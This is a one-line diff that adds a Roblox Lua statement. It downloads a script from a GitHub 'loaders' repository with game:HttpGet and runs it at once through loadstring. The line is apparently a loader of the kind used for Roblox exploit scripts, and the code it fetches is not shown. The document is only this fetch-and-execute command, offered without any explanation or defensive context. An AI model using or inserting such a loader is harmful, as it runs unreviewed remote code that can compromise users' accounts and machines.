@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/ShinobiComply/loaders/main/loaders/cure-violence-district-s0-j77qa33gdjpv1t.lua"))()
